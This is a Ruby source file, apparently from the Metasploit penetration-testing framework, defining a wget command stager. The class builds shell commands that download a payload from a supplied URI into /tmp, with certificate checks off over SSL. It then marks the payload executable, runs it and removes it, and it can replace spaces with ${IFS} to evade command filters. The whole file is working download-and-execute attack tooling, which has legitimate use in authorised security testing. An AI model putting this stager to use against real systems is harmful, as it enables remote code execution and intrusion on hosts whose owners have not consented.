# -*- coding: binary -*-

class Rex::Exploitation::CmdStagerWget < Rex::Exploitation::CmdStagerBase

  def http?
    true
  end

  def user_agent
    /^Wget/
  end

  def generate(opts = {})
    if opts[:payload_uri].nil?
      raise "#{self.class.name}##{__callee__} missing opts[:payload_uri]"
    end

    opts[:temp] ||= '/tmp'
    opts[:file] ||= Rex::Text.rand_text_alpha(8)
    opts[:silent] = true if opts[:silent].nil?
    @payload_path = "#{opts[:temp]}/#{opts[:file]}"

    super
  end

  def generate_cmds_payload(opts)
    cmds = []

    uri = opts[:payload_uri]
    ncc  = '--no-check-certificate'
    silent_flag = opts[:silent] ? 'q' : ''

    if opts[:ssl]
      cmds << "wget -#{silent_flag}O #{@payload_path} #{ncc} #{uri}"
    else
      uri = uri.gsub(%r{^http://}, '') if opts[:no_proto]
      cmds << "wget -#{silent_flag}O #{@payload_path} #{uri}"
    end

    cmds
  end

  def generate_cmds_decoder(opts)
    cmds = []

    cmds << "chmod +x #{@payload_path}"
    cmds << @payload_path
    cmds << "rm -f #{@payload_path}" unless opts[:nodelete]

    cmds
  end

  def compress_commands(cmds, opts)
    cmds.each { |cmd| cmd.gsub!(/\s+/, '${IFS}') } if opts[:nospace]
    super
  end

  def cmd_concat_operator
    ';'
  end

end
